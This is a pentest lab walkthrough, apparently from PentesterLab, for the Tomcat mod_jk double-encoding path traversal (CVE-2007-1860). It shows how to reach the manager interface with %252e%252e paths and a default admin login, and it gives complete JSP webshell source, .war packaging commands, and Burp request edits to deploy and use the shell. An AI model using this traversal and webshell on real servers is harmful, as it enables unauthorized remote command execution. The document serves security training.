# Tomcat mod_jk

### Structure

There are two common ways to "proxy" requests from Apache to Tomcat:

- http_proxy: the requests are forwarded to Tomcat using the HTTP protocol;
- ajp13: the requests are forwarded to Tomcat using the AJP13  protocol. This configuration is used in this exercise using the Apache  module **mod_jk**. 

Depending on its configuration and on the request processed, Apache will decide:

- to process the request by itself:
   ![mod_jk apache](https://assets.pentesterlab.com/cve-2007-1860/mod_jk1.png)
- to pass the request to Tomcat for processing: 
   ![mod_jk tomcat](https://assets.pentesterlab.com/cve-2007-1860/mod_jk2.png)

For example, in the following Apache configuration snippet, all requests matching `/jsp-examples/*` will be forwarded to the Tomcat server `worker1` to be processed.

```
jkMount  /jsp-examples/* worker1
```



### How to find exact url

* try url `/test1234`  and if you get a **404 error** coming from **apache** then you see a page like this:

  ![apache 404](https://assets.pentesterlab.com/cve-2007-1860/apache404.png)

* however if you try `/examples/jsp/test1234` you will get a **404 error** coming from **apache tomcat**  and you see a page like this:

  ![tomcat 404](https://assets.pentesterlab.com/cve-2007-1860/tomcat404.png)

### Accessing /manager/html login

* access it by `/examples/jsp/%252e%252e/%252e%252e/manager/html`

  `%252e` is the double encoded format of `.` 

* default username is `admin` and no password

### .war webshell making

* create a file named index.jsp:

  ```jsp
  <FORM METHOD=GET ACTION='index.jsp'>
  <INPUT name='cmd' type=text>
  <INPUT type=submit value='Run'>
  </FORM>
  <%@ page import="java.io.*" %>
  <%
     String cmd = request.getParameter("cmd");
     String output = "";
     if(cmd != null) {
        String s = null;
        try {
           Process p = Runtime.getRuntime().exec(cmd,null,null);
           BufferedReader sI = new BufferedReader(new
  InputStreamReader(p.getInputStream()));
           while((s = sI.readLine()) != null) { output += s+"</br>"; }
        }  catch(IOException e) {   e.printStackTrace();   }
     }
  %>
  <pre><%=output %></pre>
  ```

  

* We can now create a directory name `webshell` and put our file (`index.jsp`) inside it:

```
$ mkdir webshell
$ cp index.jsp webshell
```

* Now we can build the war file using `jar` (provide with java):

```
$ cd webshell
$ jar -cvf ../webshell.war *
added manifest
adding: index.jsp(in = 579) (out= 351)(deflated 39%)
```

### Deploying the webshell

![Deploy](https://assets.pentesterlab.com/cve-2007-1860/form_deploy.png)

* Upload this .war payload:  [Webshell war Payload](webshell.war)
* we can't deploy after uploading the webshell because our url is double encoding. So we need to send the war file to right path manually.
* There are 3 simple ways to bypass this issue:
  - Building an html page that will send the war to the right URL.
  - Modifying the request using a proxy.
  - Modifying the page using a browser extension like webdeveloper (or "Inspect Element" in Chrome).

### Using proxy

* visit page `examples/jsp/%252e%252e/%252e%252e/manager/html` and intercept it in burpsuite

  Do intercept response of the GET request and in the `Set-Cookie` option set `Path=/manager/` to `Path=/`.

* After clicking on `Deploy` button:

  Edit the POST request path from:

  ```
  POST /examples/html/upload?org.apache.catalina.filters.CSRF_NONCE=115CE2E49D3DC3010EDF4C1A8F494A67 HTTP/1.1
  Host: ptl-34b2c0ae-11ba3519.libcurl.so
  ```

  to:

  ```
  POST /examples/%252e%252e/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=115CE2E49D3DC3010EDF4C1A8F494A67 HTTP/1.1
  Host: ptl-34b2c0ae-11ba3519.libcurl.so
  ```

### Using Webshell

* visit `/examples/%252e%252e/webshell/` and run your command